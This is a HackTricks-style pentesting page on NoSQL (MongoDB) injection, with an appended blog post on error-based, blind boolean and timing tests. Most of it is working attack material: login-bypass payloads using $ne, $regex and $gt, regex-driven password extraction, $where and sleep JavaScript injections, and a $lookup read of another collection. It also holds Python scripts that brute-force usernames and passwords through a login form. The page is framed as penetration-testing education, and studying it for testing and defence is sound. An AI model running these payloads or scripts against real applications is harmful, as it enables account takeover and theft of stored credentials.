# NoSQL injection

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a><a href="https://twitter.com/carlospolopm"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## Exploit

In PHP you can send an Array changing the sent parameter from _parameter=foo_ to _parameter\[arrName]=foo._

The exploits are based in adding an **Operator**:

```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```

### Basic authentication bypass

**Using not equal ($ne) or greater ($gt)**

```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

### **SQL - Mongo**

```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```

### Extract **length** information

```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```

### Extract **data** information

```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

### **SQL - Mongo**

```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```

### PHP Arbitrary Function Execution

Using the **$func** operator of the [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) library (used by default) it might be possible to execute and arbitrary function as in [this report](https://swarm.ptsecurity.com/rce-cockpit-cms/).

```python
"user":{"$func": "var_dump"}
```

![](<../.gitbook/assets/image (468).png>)

### Get info from different collection

It's possible to use [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) to get info from a different collection. In the following example, we are reading from a **different collection** called **`users`** and getting the **results of all the entries** with a password matching a wildcard.

```json
[
  {
    "$lookup":{
      "from": "users",
      "as":"resultado","pipeline": [
        {
          "$match":{
            "password":{
              "$regex":"^.*"
            }
          }
        }
      ]
    }
  }
]
```





![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Blind NoSQL

```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://chall.com?param=^"+flag+char)
        if ("<TRUE>" in r.text):
            flag += char
            print("[+] Flag: "+flag)
            break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = {'ids': payload}, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

## MongoDB Payloads

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```

## Tools

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

### Brute-force login usernames and passwords from POST login

This is a simple script that you could modify but the previous tools can also do this task.

```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)
```

## References

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a><a href="https://twitter.com/carlospolopm"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}


##
##


I was recently discussing how to exploit NoSQL vulnerabilities with a bug bounty tester who had successfully used my NoSQLi program to find a vulnerability on a major site (and received a $3k bounty!).

Using the scan tool is a great way to find some injectable strings, but to extract data, it's important to understand the types of injections possible with NoSQL systems, and how they present. For a instructions on setting up a test environment and introduction to NoSQLi, you can also see my post A NoSQL Injection Primer

In this post, I'll walk through the various ways that you might determine if injections are possible, focusing primarily on the most popular NoSQL database, Mongo. From simplest to hardest:

Error based injection (when the server returns a clear NoSQL error)
Blind boolean based injection (When the server evaluates a statement as true or false)
Timing Injections.
Where & How to Inject Payloads
Anywhere you might expect to see SQL injection, you can potentially find nosql injection. consider URL parameters, POST parameters, and even sometimes HTTP headers.

GET requests can often be typed into the browser directly by adding nosql into the URL directly:

1. site.com/page?query=term || '1'=='1
2. site.com/page?user[$ne]=nobody
POST requests generally need to be intercepted and modified, as NoSQL often includes JSON object structures.

1. {"username": "user", "password": "pass"} 
	would change to 
{"username": {"ne": "fakeuser"}, password: "pass"}
2. {"$where":  "return true"}
Each NoSQL system may have it's own syntax, but mongo allows for both JSON (Technically BSON, but that generally happens under the hood server side) and JavaScript. JS can run directly in the Mongo server if passed through functions that allow it, and JS is enabled on the server (it is enabled by default).

If you already understand SQL injection, the concepts here are mostly the same, and only the details differ.

Simple Error Based NoSQL Injection Tests
The simplest way to determine if injection is possible is to input some special noSQL characters, and see if the server returns an error. This might be a full error string indicating the NoSQL database in use, or something like a 500 error.

'"\/$[].>
Plug this string into each GET parameter to see if an error occurs
Replace elements in posted JSON contents with these special characters, or NoSQL keywords like $ne, $eq, $where, $or, etc to see if there are errors.
Send additional objects along with valid JSON. For instance {"user": "nullsweep"} could become {"user": ["nullsweep", "foo"]} or {"$or": [{"user": "foo"}, {"user": "realuser"}]}
Some of these characters may also trigger other injection vulnerabilities (JS injection, SQL injection, shell injection, etc), so further testing may be needed to ensure it is a NoSQL backend.

Blind Boolean Injection
If sending special characters doesn't cause the site to send error information, it may still be possible to find an injection by sending boolean expressions (a true or false result) if the page changes depending on the answer. For instance, a product page with a product ID parameter that is injectable may return product details for one query, but a product not found message otherwise.

A backend query that is looking up a product by doing something like "id = $id" might use a query like db.product.find( {"id": 5} ). Ideally, we would want to control the whole query to inject something always false such as db.product.find( {"$and": [ {"id": 5}, {"id": 6} ]. It isn't always possible to inject operators like $and and $or because the operators preceed the field labels.

Instead, we may have to try a few different things. We could try to make the query match everything but the ID 5: db.product.find( {"id": {"$ne": 5} } ) or use the $in or $nin operators such as db.product.find( {"id": {"$in": []} }) to ensure returning no data.

If the injection is successful, you will see a difference between the 'true' version and 'false' version.

The Boolean Injection Cheatsheet:
{"$ne": -1}
{"$in": []}
{"$and": [ {"id": 5}, {"id": 6} ]}
{"$where":  "return true"}
{"$or": [{},{"foo":"1"}]}
site.com/page?query=term || '1'=='1
site.com/page?user[$ne]=nobody
site.com/page?user=;return true
You may need to try appending certain characters to correctly terminate the query:

//
%00
'
"
some number of closing brackets or braces, in some combination
Timing Based Injection
Sometimes, even when injection is possible and the attacker has sent valid true and false values, the page response is identical, and it can't be determined if an injection was successful or not.

In these cases, we can still try to determine if an injection takes place by asking the NoSQL instance to pause for a period of time before returning results, and detecting the resulting difference in time as the proof of successful injection. Timing injection is identical to blind boolean injection, except instead of trying to get the page to return true or false values, we try to get the page the load more slowly (for true) or quickly (for false).

You will likely need several page loads to gather baseline timing information before beginning the injection. The longer sleep times used in this injection type, the easier it is to spot in the results, but the longer it will take to gather information.

Timing injections are only possible where JS can be executed in the database, and can lead to other interesting attacks.

Timing NoSql Injection Cheatsheet:
{"$where":  "sleep(100)"}
;sleep(100);
NoSQL Injection Limitations
Unlike SQL injection, finding that a site is injectable may not give unfettered access to the data. How the injection presents may allow full control over the backend, or limited querying ability on a single schema. Because records don't follow a common structure, discovering the structure can prove an additional challenge when exploiting these types of vulnerabilities.

To automate finding all of these things, check out NoSQLi

Happy Hunting!

##
##
